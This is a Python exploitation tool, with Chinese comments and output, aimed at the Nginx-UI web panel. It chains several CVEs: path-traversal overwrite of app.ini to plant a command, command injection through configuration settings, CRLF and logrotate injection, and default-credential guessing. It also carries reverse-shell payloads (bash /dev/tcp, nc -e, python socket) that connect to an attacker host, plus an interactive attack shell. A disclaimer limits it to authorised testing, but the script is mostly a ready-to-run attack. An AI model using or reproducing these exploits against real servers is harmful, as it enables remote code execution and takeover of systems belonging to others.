#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nginx-UI 综合漏洞检测/利用脚本 v1.0
覆盖 Nginx-UI 未授权文件写入 / CRLF 注入 / 命令注入 RCE
仅用于授权安全测试 / 靶场验证

攻击模式:
  check  — 综合漏洞检测 (默认)
  rce    — 远程命令执行
  shell  — 交互式利用 Shell

CVE 覆盖:
  CVE-2024-23827  — 证书导入路径穿越任意文件写入 (CVSS 9.8, 未授权)
  CVE-2024-22197  — API test_config_cmd 命令注入 RCE (CVSS 8.8, 需认证)
  CVE-2024-22198  — API start_cmd 命令注入 RCE (CVSS 8.8, 需认证)
  CVE-2024-23828  — CRLF 注入绕过修复 (CVSS 8.8, 需认证)
  CVE-2024-49368  — logrotate 命令注入 (CVSS 9.8)
  CVE-2024-49366  — 目录穿越 (CVSS 7.5)
  CVE-2024-49367  — 日志路径可控 + 目录穿越 (CVSS 7.5)
  无 CVE          — 默认凭据 / 信息泄露
"""

import requests
import sys
import argparse
import re
import random
import string
import time
import json
import urllib.parse
from typing import Optional, Tuple, List, Dict

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║     Nginx-UI 综合漏洞检测/利用工具 v1.0                         ║
║     文件写入 / 命令注入 / CRLF 绕过 | 仅限授权安全使用        ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def build_url(base: str, path: str) -> str:
    return f"{base.rstrip('/')}/{path.lstrip('/')}"


def new_session(timeout: int = 10) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
    })
    s.timeout = timeout
    return s


def login(url: str, s: requests.Session, username: str, password: str) -> Tuple[bool, str]:
    """登录 Nginx-UI, 返回 (成功, token)
    Nginx-UI 使用 RSA 加密传输凭据 (EncryptedParams 中间件)
    步骤: 1) 获取 RSA 公钥  2) 加密凭据  3) 发送登录请求
    """
    try:
        # 方法1: 获取 RSA 公钥并加密传输 (新版 Nginx-UI)
        try:
            r_crypto = s.get(build_url(url, '/api/crypto'), timeout=5)
            if r_crypto.status_code == 200:
                crypto_data = r_crypto.json()
                public_key_pem = crypto_data.get('public_key', '') or crypto_data.get('data', {}).get('public_key', '')
                if public_key_pem:
                    from cryptography.hazmat.primitives import serialization, hashes
                    from cryptography.hazmat.primitives.asymmetric import padding
                    import base64

                    pubkey = serialization.load_pem_public_key(public_key_pem.encode())
                    enc_name = base64.b64encode(
                        pubkey.encrypt(username.encode(),
                                       padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                    algorithm=hashes.SHA256(), label=None))
                    ).decode()
                    enc_pwd = base64.b64encode(
                        pubkey.encrypt(password.encode(),
                                       padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                    algorithm=hashes.SHA256(), label=None))
                    ).decode()

                    r = s.post(build_url(url, '/api/login'),
                               json={'name': enc_name, 'password': enc_pwd},
                               timeout=10)
                    if r.status_code == 200:
                        data = r.json()
                        token = data.get('token', '')
                        if token:
                            s.headers['Authorization'] = f'Bearer {token}'
                            return True, token
                    elif r.status_code == 199:
                        safe_print(f"  {C.YLW}[*] 登录需要 2FA 验证 (HTTP 199){C.RST}")
        except ImportError:
            pass  # cryptography 库未安装, 回退明文
        except Exception:
            pass  # 加密方式失败, 回退明文

        # 方法2: 明文传输 (旧版 Nginx-UI 或未启用 EncryptedParams)
        r = s.post(build_url(url, '/api/login'),
                   json={'name': username, 'password': password}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            token = data.get('token', '')
            if token:
                s.headers['Authorization'] = f'Bearer {token}'
                return True, token
        elif r.status_code == 199:
            safe_print(f"  {C.YLW}[*] 登录需要 2FA 验证 (HTTP 199){C.RST}")

        return False, ''
    except Exception as e:
        safe_print(f"  {C.YLW}[*] 登录异常: {e}{C.RST}")
        return False, ''


# ===================== 0. 指纹检测 =====================

def detect_nginx_ui(url: str, s: requests.Session) -> Tuple[bool, Optional[str], Dict]:
    safe_print(f"\n{C.YLW}[0] 指纹检测{C.RST}")
    info: Dict = {}

    probes = [
        ('/', ['nginx-ui', 'Nginx UI', 'nginx ui', '0xJacky'], '首页'),
        ('/api/version', ['version'], 'API 版本'),
        ('/api/settings', ['nginx'], 'API 设置'),
        ('/api/configs', ['config', 'nginx'], 'API 配置'),
    ]

    detected = False
    for path, keywords, desc in probes:
        try:
            r = s.get(build_url(url, path), timeout=8, allow_redirects=True)
            text_lower = r.text.lower()
            for kw in keywords:
                if kw.lower() in text_lower:
                    safe_print(f"  {C.GRN}[+] 确认 Nginx-UI — {desc} (特征: {kw}){C.RST}")
                    detected = True
                    break
            if detected:
                break
        except Exception:
            continue

    if not detected:
        safe_print(f"  {C.CYN}[-] 未识别 Nginx-UI 特征 (将继续检测){C.RST}")
        return False, None, info

    # 版本
    version = None
    try:
        r = s.get(build_url(url, '/api/version'), timeout=8)
        v = r.json()
        version = str(v.get('version', v.get('current_version', '')))
        if version:
            safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
    except Exception:
        try:
            r = s.get(build_url(url, '/'), timeout=8)
            m = re.search(r'v(\d+\.\d+\.\d+(?:-beta\.?\d+)?)', r.text)
            if m:
                version = m.group(1)
                safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
        except Exception:
            pass

    return True, version, info


# ===================== 1. CVE-2024-23827 — 证书导入路径穿越 =====================

def check_cve_2024_23827_file_write(url: str, s: requests.Session) -> Tuple[bool, str]:
    """
    CVE-2024-23827: 证书导入路径穿越任意文件写入 (CVSS 9.8, 未授权)
    影响: < v2.0.0-beta.12
    """
    safe_print(f"\n{C.YLW}[1] CVE-2024-23827: 证书导入路径穿越任意文件写入 (CVSS 9.8){C.RST}")
    safe_print(f"  {C.CYN}    影响: < v2.0.0-beta.12 | 未授权 | 可覆盖 app.ini → RCE{C.RST}")

    rk = randstr(6)
    marker = f'NUI_TEST_{rk}'

    # 路径穿越 payload: 写入到 app.ini 同级目录的测试文件
    cert_payloads = [
        # 直接路径穿越
        {'path': f'../../../../tmp/nginx_ui_test_{rk}.txt',
         'cert': marker, 'key': marker},
        # 写入到当前目录
        {'path': f'../nginx_ui_test_{rk}.txt',
         'cert': marker, 'key': marker},
    ]

    for pl in cert_payloads:
        try:
            r = s.post(build_url(url, '/api/cert'), json={
                'name': pl['path'],
                'certificate': pl['cert'],
                'key': pl['key'],
            }, timeout=10)

            safe_print(f"  {C.CYN}[*] 测试路径: {pl['path']} → HTTP {r.status_code}{C.RST}")

            if r.status_code == 200:
                resp_data = r.json() if r.text else {}
                # 成功写入时可能返回 success
                if isinstance(resp_data, dict):
                    safe_print(f"  {C.GRN}[+] 路径穿越写入可能成功! 响应: {str(resp_data)[:200]}{C.RST}")
                    safe_print(f"  {C.RED}[!] CVE-2024-23827 疑似存在{C.RST}")
                    safe_print(f"  {C.RED}    可构造攻击: 覆盖 app.ini → 注入 start_cmd → RCE{C.RST}")
                    return True, pl['path']
        except Exception:
            continue

    # 额外探测: 尝试 POST 到 certificate 相关端点
    try:
        r = s.post(build_url(url, '/api/certificate'), json={
            'name': f'../nginx_ui_test_{rk}.txt',
            'content': marker,
        }, timeout=10)
        if r.status_code == 200:
            safe_print(f"  {C.GRN}[+] /api/certificate 端点可访问 (HTTP 200){C.RST}")
    except Exception:
        pass

    safe_print(f"  {C.CYN}[-] 未确认 CVE-2024-23827 (可能已修复 /beta.12+){C.RST}")
    return False, ''


# ===================== 2. CVE-2024-22197/22198 — 认证 RCE =====================

def check_authenticated_rce(url: str, s: requests.Session, username: str,
                            password: str) -> Tuple[bool, List[str]]:
    """
    CVE-2024-22197: test_config_cmd 命令注入
    CVE-2024-22198: start_cmd 命令注入
    影响: < v2.0.0-beta.9
    """
    safe_print(f"\n{C.YLW}[2] CVE-2024-22197 / CVE-2024-22198: 认证 RCE (CVSS 8.8){C.RST}")
    safe_print(f"  {C.CYN}    影响: < v2.0.0-beta.9 | 需认证 | test_config_cmd/start_cmd 注入{C.RST}")

    hits = []
    logged_in = False

    if username and password:
        ok, token = login(url, s, username, password)
        if ok:
            logged_in = True
            safe_print(f"  {C.GRN}[+] 已认证 (token: {token[:20]}...){C.RST}")
        else:
            safe_print(f"  {C.CYN}[-] 认证失败, 跳过认证 RCE 检测{C.RST}")
            return False, []
    else:
        safe_print(f"  {C.CYN}[-] 需要凭据, 跳过 (可指定 --username --password){C.RST}")
        return False, []

    # 读取当前 settings
    try:
        r = s.get(build_url(url, '/api/settings'), timeout=8)
        if r.status_code == 200:
            settings = r.json()
            safe_print(f"  {C.GRN}[+] 可读取 settings{C.RST}")
    except Exception:
        pass

    # 尝试修改 test_config_cmd
    rk = randstr(6)
    markers = {
        'test_config_cmd': f'echo TESTCFG_{rk}',
        'start_cmd': f'echo START_{rk}',
    }

    for key, cmd in markers.items():
        try:
            r = s.post(build_url(url, '/api/settings'), json={
                key: cmd,
            }, timeout=10)
            safe_print(f"  {C.CYN}[*] 尝试修改 {key} → HTTP {r.status_code}{C.RST}")
            if r.status_code == 200:
                safe_print(f"  {C.RED}[!] 成功修改 {key}!{C.RST}")
                hits.append(f'CVE-2024-{"22197" if "test" in key else "22198"} ({key} 命令注入)')
        except Exception:
            continue

    if hits:
        safe_print(f"  {C.RED}[!] 认证 RCE 确认存在!{C.RST}")
    else:
        safe_print(f"  {C.CYN}[-] 未确认认证 RCE (可能已修复 /beta.9+){C.RST}")

    return logged_in, hits


# ===================== 3. CVE-2024-23828 — CRLF 绕过 =====================

def check_cve_2024_23828_crlf(url: str, s: requests.Session) -> bool:
    safe_print(f"\n{C.YLW}[3] CVE-2024-23828: CRLF 注入绕过修复 (CVSS 8.8){C.RST}")
    safe_print(f"  {C.CYN}    影响: < v2.0.0-beta.12 | 需认证 | 绕过 CVE-2024-22197/22198 修复{C.RST}")

    # CRLF 注入检测: 尝试在 settings 值中注入换行
    try:
        r = s.post(build_url(url, '/api/settings'), json={
            'test_config_cmd': 'nginx -t\r\necho CRLF_INJECT',
        }, timeout=10)
        safe_print(f"  {C.CYN}[*] CRLF 注入检测 → HTTP {r.status_code}{C.RST}")
        if r.status_code == 200:
            safe_print(f"  {C.YLW}[*] CRLF 注入可能未被过滤 (需验证生效){C.RST}")
    except Exception:
        pass

    safe_print(f"  {C.CYN}[-] 需认证上下文才能确认 CRLF 注入{C.RST}")
    return False


# ===================== 4. CVE-2024-49368 — logrotate 命令注入 =====================

def check_cve_2024_49368_logrotate(url: str, s: requests.Session) -> bool:
    safe_print(f"\n{C.YLW}[4] CVE-2024-49368: logrotate 命令注入 (CVSS 9.8){C.RST}")
    safe_print(f"  {C.CYN}    影响: < v2.0.0-beta.36 | logrotate 配置拼接命令{C.RST}")

    # logrotate 命令注入: cmd 参数拼接
    rk = randstr(6)
    try:
        # 尝试 POST cmd 参数
        r = s.post(build_url(url, '/api/nginx/logrotate'), json={
            'cmd': f'echo LOGTEST_{rk}',
        }, timeout=10)
        if r.status_code == 200:
            safe_print(f"  {C.YLW}[*] logrotate 端点响应 (HTTP 200){C.RST}")
            safe_print(f"  {C.YLW}    需验证命令是否实际执行{C.RST}")
    except Exception:
        pass

    # 尝试 GET 方式
    try:
        r = s.get(build_url(url, f'/api/nginx/logrotate?cmd=echo%20LOGTEST_{rk}'), timeout=10)
        if r.status_code == 200:
            safe_print(f"  {C.YLW}[*] logrotate GET 端点可用{C.RST}")
    except Exception:
        pass

    safe_print(f"  {C.CYN}[-] 无法远程确认 CVE-2024-49368 (需观察服务端行为){C.RST}")
    return False


# ===================== 5. 默认凭据 / 信息泄露 =====================

def check_default_credentials(url: str, s: requests.Session) -> Tuple[List[str], str, str]:
    safe_print(f"\n{C.YLW}[5] 默认凭据 / 弱口令检测{C.RST}")
    hits = []

    defaults = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456'),
        ('nginx', 'nginx'),
        ('user', 'user'),
    ]

    for user, pwd in defaults:
        ok, token = login(url, s, user, pwd)
        if ok:
            safe_print(f"  {C.RED}[!] 凭据有效: {user}:{pwd}{C.RST}")
            hits.append(f'{user}:{pwd}')
            return hits, user, pwd

    safe_print(f"  {C.GRN}[+] 常见默认凭据无效{C.RST}")
    return hits, '', ''


def check_info_disclosure(url: str, s: requests.Session) -> List[str]:
    safe_print(f"\n{C.YLW}[6] 信息泄露 / API 审计{C.RST}")
    hits = []

    endpoints = [
        ('/api/version', '版本信息'),
        ('/api/settings', '全局设置'),
        ('/api/configs', 'Nginx 配置'),
        ('/api/sites', '站点列表'),
        ('/api/users', '用户列表'),
        ('/api/nginx/status', 'Nginx 状态'),
        ('/api/nginx/log', 'Nginx 日志'),
        ('/api/logs', '系统日志'),
        ('/api/certs', '证书列表'),
    ]

    for ep, desc in endpoints:
        try:
            r = s.get(build_url(url, ep), timeout=8)
            if r.status_code == 200 and len(r.text) > 10:
                safe_print(f"  {C.YLW}[*] 未授权访问 — {desc} ({ep}, HTTP 200){C.RST}")
                hits.append(f'信息泄露 ({desc})')
                if 'version' in ep.lower():
                    safe_print(f"  {C.YLW}    内容: {r.text[:200].strip()}{C.RST}")
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] API 端点需要认证{C.RST}")
    return hits


# ===================== 利用函数 =====================

def exploit_file_write_rce(url: str, s: requests.Session, command: str) -> Optional[str]:
    """
    利用 CVE-2024-23827 路径穿越覆盖 app.ini → RCE
    覆盖 start_cmd 或 test_config_cmd, 触发后执行命令
    """
    safe_print(f"\n{C.BLD}[CVE-2024-23827] 文件写入 RCE: {command}{C.RST}\n")

    # 构造恶意 app.ini 内容:
    # 包含注入的 start_cmd + 修改其他关键配置
    malicious_ini = f'''[server]
HttpHost = 0.0.0.0
HttpPort = 9000
RunMode = release

[nginx]
AccessLogPath = /var/log/nginx/access.log
ErrorLogPath = /var/log/nginx/error.log
ConfigDir = /etc/nginx/conf.d
PIDPath = /var/run/nginx.pid
TestConfigCmd = nginx -t
ReloadCmd = nginx -s reload
RestartCmd = {command}

[logrotate]
Enabled = true
CMD = echo ok

[auth]
Challenge = true
Secret = nginx-ui-secret
'''

    # 路径穿越路径 (尝试多个常用 Nginx-UI 路径)
    appini_paths = [
        '../../../etc/nginx-ui/app.ini',
        '../../app.ini',
        '../app.ini',
    ]

    for ini_path in appini_paths:
        safe_print(f"  {C.CYN}[*] 尝试写入: {ini_path}{C.RST}")
        try:
            r = s.post(build_url(url, '/api/cert'), json={
                'name': ini_path,
                'certificate': malicious_ini[:500],
                'key': malicious_ini[500:],
            }, timeout=10)
            if r.status_code == 200:
                safe_print(f"  {C.GRN}[+] 写入成功! 等待 Nginx-UI 重启执行命令...{C.RST}")
                safe_print(f"  {C.YLW}    需触发 Nginx-UI 进程重启或等待自动重载{C.RST}")
                return f'app.ini 已覆写 (等待重启触发: {command})'
        except Exception as e:
            safe_print(f"  {C.CYN}    失败: {e}{C.RST}")

    safe_print(f"  {C.RED}[-] 文件写入利用未成功{C.RST}")
    return None


def exploit_authenticated_rce(url: str, s: requests.Session, command: str) -> Optional[str]:
    """利用 CVE-2024-22197/22198 认证 RCE"""
    safe_print(f"\n{C.BLD}[CVE-2024-22197] 认证 RCE: {command}{C.RST}\n")

    # 修改 test_config_cmd
    try:
        r = s.post(build_url(url, '/api/settings'), json={
            'test_config_cmd': command,
        }, timeout=10)
        safe_print(f"  {C.CYN}[*] 修改 test_config_cmd → HTTP {r.status_code}{C.RST}")

        if r.status_code == 200:
            safe_print(f"  {C.GRN}[+] 设置已修改!{C.RST}")

            # 触发: 调 test config API
            try:
                r2 = s.post(build_url(url, '/api/nginx/test'), timeout=20)
                safe_print(f"  {C.CYN}[*] 触发 nginx test → HTTP {r2.status_code}{C.RST}")
                if r2.status_code == 200:
                    safe_print(f"  {C.GRN}[+] 命令已执行!{C.RST}")
                    return f"已执行 (test_config_cmd: {command})"
            except Exception:
                pass

            safe_print(f"  {C.GRN}[+] 设置已保存, 等待下次 nginx test 触发{C.RST}")
            return f"已保存 (等待触发: {command})"
    except Exception as e:
        safe_print(f"  {C.RED}失败: {e}{C.RST}")

    return None


def exploit_reverse_shell(url: str, lhost: str, lport: int,
                          s: requests.Session, username: str = '',
                          password: str = '') -> bool:
    safe_print(f"\n{C.BLD}反弹 Shell → {lhost}:{lport}{C.RST}\n")

    payloads = [
        f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
        f'nc -e /bin/bash {lhost} {lport}',
        f'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{lhost}\',{lport}));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call([\'/bin/sh\',\'-i\'])"',
    ]

    if username and password:
        ok, _ = login(url, s, username, password)
        if not ok:
            safe_print(f"{C.RED}[-] 认证失败{C.RST}")
            return False
        for pl in payloads:
            exploit_authenticated_rce(url, s, pl)
            time.sleep(0.5)
    else:
        for pl in payloads:
            exploit_file_write_rce(url, s, pl)
            time.sleep(0.5)

    safe_print(f"\n{C.GRN}{'─' * 50}{C.RST}")
    safe_print(f"{C.BLD}监听: nc -lvnp {lport}{C.RST}")
    safe_print(f"{C.GRN}{'─' * 50}{C.RST}\n")
    return True


# ===================== 交互式 Shell =====================

def interactive_shell(url: str, s: requests.Session, username: str = '',
                      password: str = ''):
    safe_print(f"\n{C.GRN}[+] 交互式 Nginx-UI Shell (exit 退出){C.RST}")
    safe_print(f"{C.CYN}    目标: {url}{C.RST}")

    logged_in = False
    if username and password:
        logged_in, token = login(url, s, username, password)
        safe_print(f"{C.CYN}    认证: {'OK' if logged_in else '失败'}{C.RST}")

    safe_print(f"{C.CYN}    CVE-2024-23827 (未授权文件写入) | CVE-2024-22197 (认证RCE){C.RST}\n")

    while True:
        try:
            cmd = input(f"{C.RED}Nginx-UI[{url}]>{C.RST} ").strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                break

            parts = cmd.split(maxsplit=1)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ''

            if action == 'help':
                safe_print(f"""
{C.BLD}命令:{C.RST}
  {C.GRN}exec <cmd>{C.RST}         认证RCE (CVE-2024-22197)
  {C.GRN}write <cmd>{C.RST}        文件写入RCE (CVE-2024-23827)
  {C.GRN}reverse <LHOST> <LPORT>{C.RST}  反弹 Shell
  {C.GRN}login <user> <pass>{C.RST}  登录获取 Token
  {C.GRN}settings{C.RST}           读取全局设置
  {C.GRN}config{C.RST}             读取 Nginx 配置
  {C.GRN}cert <path>{C.RST}        测试路径穿越 (CVE-2024-23827)
  {C.GRN}get <path>{C.RST}         发送 GET 请求
  {C.GRN}post <path> <json>{C.RST}  发送 POST 请求
  {C.GRN}check{C.RST}              综合漏洞检测
  {C.GRN}info{C.RST}               目标信息
                """)
                continue

            if action == 'exec':
                if not arg:
                    safe_print(f"{C.YLW}用法: exec <command>{C.RST}")
                    continue
                if logged_in:
                    exploit_authenticated_rce(url, s, arg)
                else:
                    safe_print(f"{C.RED}需要先登录: login <user> <pass>{C.RST}")
                continue

            if action == 'write':
                if not arg:
                    safe_print(f"{C.YLW}用法: write <command>{C.RST}")
                    continue
                exploit_file_write_rce(url, s, arg)
                continue

            if action == 'reverse':
                args_list = arg.split()
                if len(args_list) < 2:
                    safe_print(f"{C.YLW}用法: reverse <LHOST> <LPORT>{C.RST}")
                    continue
                exploit_reverse_shell(url, args_list[0], int(args_list[1]),
                                      s, username, password)
                continue

            if action == 'login':
                args_list = arg.split()
                if len(args_list) < 2:
                    safe_print(f"{C.YLW}用法: login <user> <pass>{C.RST}")
                    continue
                logged_in, token = login(url, s, args_list[0], args_list[1])
                if logged_in:
                    username, password = args_list[0], args_list[1]
                    safe_print(f"  {C.GRN}[+] 登录成功: {token[:30]}...{C.RST}")
                else:
                    safe_print(f"  {C.RED}[-] 登录失败{C.RST}")
                continue

            if action == 'settings':
                try:
                    r = s.get(build_url(url, '/api/settings'), timeout=8)
                    safe_print(f"HTTP {r.status_code}\n{r.text[:3000]}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'config':
                try:
                    r = s.get(build_url(url, '/api/configs'), timeout=8)
                    safe_print(f"HTTP {r.status_code}\n{r.text[:3000]}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'cert':
                target_path = arg or f'../nginx_ui_test_{randstr(4)}.txt'
                mk = randstr(6)
                try:
                    r = s.post(build_url(url, '/api/cert'), json={
                        'name': target_path,
                        'certificate': f'TEST_{mk}',
                        'key': f'KEY_{mk}',
                    }, timeout=10)
                    safe_print(f"HTTP {r.status_code}")
                    safe_print(f"路径: {target_path} → {r.text[:500]}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'get':
                if not arg:
                    safe_print(f"{C.YLW}用法: get <path>{C.RST}")
                    continue
                try:
                    r = s.get(build_url(url, arg), timeout=10)
                    safe_print(f"HTTP {r.status_code}\n{r.text[:2000]}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'post':
                args_list = arg.split(maxsplit=1)
                if len(args_list) < 2:
                    safe_print(f"{C.YLW}用法: post <path> <json>{C.RST}")
                    continue
                try:
                    data = json.loads(args_list[1])
                    r = s.post(build_url(url, args_list[0]), json=data, timeout=10)
                    safe_print(f"HTTP {r.status_code}\n{r.text[:2000]}")
                except json.JSONDecodeError:
                    safe_print(f"{C.RED}JSON 格式错误{C.RST}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'check':
                run_all_checks(url, s, username, password)
                continue

            if action == 'info':
                try:
                    r = s.get(build_url(url, '/api/version'), timeout=8)
                    safe_print(f"版本: {r.text[:200]}")
                except Exception:
                    pass
                for ep in ['/api/settings', '/api/configs', '/api/users', '/api/certs']:
                    try:
                        r = s.get(build_url(url, ep), timeout=5)
                        if r.status_code == 200:
                            safe_print(f"  {C.GRN}{ep}: 可访问 ({len(r.text)}B){C.RST}")
                    except Exception:
                        pass
                continue

            safe_print(f"{C.YLW}未知命令, 输入 help 查看帮助{C.RST}")

        except KeyboardInterrupt:
            safe_print("\n输入 'exit' 退出")
        except EOFError:
            break
        except Exception as e:
            safe_print(f"{C.RED}错误: {e}{C.RST}")


# ===================== 主流程 =====================

def run_all_checks(url: str, s: requests.Session, username: str = '',
                   password: str = '') -> List[str]:
    all_hits: List[str] = []

    # 0. 指纹
    is_nui, version, info = detect_nginx_ui(url, s)
    if not is_nui:
        safe_print(f"\n{C.RED}未检测到 Nginx-UI 服务{C.RST}")
        return all_hits
    if version:
        all_hits.append(f'版本: {version}')

    # 1. CVE-2024-23827 (未授权)
    hit, _ = check_cve_2024_23827_file_write(url, s)
    if hit:
        all_hits.append('CVE-2024-23827 证书导入路径穿越 (CVSS 9.8)')

    # 2. CVE-2024-22197/22198 (认证)
    if username and password:
        logged_in, rce_hits = check_authenticated_rce(url, s, username, password)
        all_hits.extend(rce_hits)
        if rce_hits:
            # 3. CVE-2024-23828 CRLF bypass
            check_cve_2024_23828_crlf(url, s)
    else:
        # 不传凭据时也试默认
        safe_print(f"\n{C.YLW}[2] 认证 RCE — 需要凭据, 尝试默认...{C.RST}")
        creds, u, p = check_default_credentials(url, s)
        all_hits.extend([f'默认凭据: {c}' for c in creds])
        if u and p:
            logged_in, rce_hits = check_authenticated_rce(url, s, u, p)
            all_hits.extend(rce_hits)
        else:
            safe_print(f"  {C.YLW}    可指定 --username --password 检测认证 RCE{C.RST}")

    # 4. CVE-2024-49368 logrotate
    check_cve_2024_49368_logrotate(url, s)

    # 5. 信息泄露
    info_hits = check_info_disclosure(url, s)
    all_hits.extend(info_hits)

    # ===== 汇总 =====
    unique_hits = list(dict.fromkeys(all_hits))
    safe_print(f"\n\n{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"{C.BLD}  检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"  目标   : {url}")
    if version:
        safe_print(f"  版本   : Nginx-UI {version}")

    if unique_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(unique_hits)} 个安全问题:{C.RST}")
        for h in unique_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
        if any('23827' in h or '22197' in h for h in unique_hits):
            safe_print(f"\n  {C.RED}{C.BLD}[!!!] 存在 RCE 漏洞 (CVSS ≥ 8.8){C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞 (可能已修复){C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}\n")
    return unique_hits


def main():
    banner()

    parser = argparse.ArgumentParser(
        description='Nginx-UI 综合漏洞检测/利用工具 v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 综合检测 (默认)
  python nginx_ui_check.py -u http://192.168.1.100:9000

  # 带认证检测
  python nginx_ui_check.py -u http://target:9000 --username admin --password admin

  # 未授权文件写入 RCE
  python nginx_ui_check.py -u http://target:9000 rce "id" --mode filewrite

  # 认证 RCE (修改 test_config_cmd)
  python nginx_ui_check.py -u http://target:9000 rce "whoami" --username admin --password admin

  # 反弹 Shell
  python nginx_ui_check.py -u http://target:9000 rce --reverse --lhost 10.0.0.1 --lport 4444

  # 交互式 Shell
  python nginx_ui_check.py -u http://target:9000 shell
        ''',
    )
    parser.add_argument('-u', '--url', required=True,
                        help='目标 URL (例: http://target:9000)')
    parser.add_argument('--username', help='Nginx-UI 用户名')
    parser.add_argument('--password', help='Nginx-UI 密码')
    parser.add_argument('--timeout', type=int, default=10, help='超时秒数 (默认 10)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')
    parser.add_argument('--proxy', help='HTTP 代理')

    sub = parser.add_subparsers(dest='mode', help='攻击模式')
    sub.add_parser('check', help='综合漏洞检测 (默认)')

    rce_p = sub.add_parser('rce', help='远程命令执行')
    rce_p.add_argument('command', nargs='?', help='要执行的命令')
    rce_p.add_argument('--mode', choices=['filewrite', 'auth'], default='auth',
                       help='RCE 模式: filewrite (CVE-2024-23827) / auth (CVE-2024-22197)')
    rce_p.add_argument('--reverse', action='store_true', help='反弹 Shell')
    rce_p.add_argument('--lhost', help='反弹 Shell 监听 IP')
    rce_p.add_argument('--lport', type=int, help='反弹 Shell 监听端口')

    sub.add_parser('shell', help='交互式利用 Shell')

    args = parser.parse_args()
    if not args.mode:
        args.mode = 'check'
    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    url = args.url.rstrip('/')
    s = new_session(args.timeout)
    if args.proxy:
        s.proxies = {'http': args.proxy, 'https': args.proxy}

    username = args.username or ''
    password = args.password or ''

    if args.mode == 'check':
        run_all_checks(url, s, username, password)
    elif args.mode == 'rce':
        if args.reverse:
            if not args.lhost or not args.lport:
                safe_print(f"{C.RED}反弹 Shell 需要 --lhost 和 --lport{C.RST}")
                sys.exit(1)
            exploit_reverse_shell(url, args.lhost, args.lport, s, username, password)
        elif args.command:
            if args.mode == 'filewrite':
                exploit_file_write_rce(url, s, args.command)
            else:
                if username and password:
                    ok, _ = login(url, s, username, password)
                    if not ok:
                        safe_print(f"{C.RED}认证失败, 尝试 --mode filewrite 利用 CVE-2024-23827{C.RST}")
                        sys.exit(1)
                    exploit_authenticated_rce(url, s, args.command)
                else:
                    safe_print(f"{C.RED}认证 RCE 需要 --username --password, 或使用 --mode filewrite{C.RST}")
        else:
            safe_print(f"{C.RED}需要指定命令或 --reverse{C.RST}")
    elif args.mode == 'shell':
        interactive_shell(url, s, username, password)

    safe_print("")


if __name__ == '__main__':
    main()
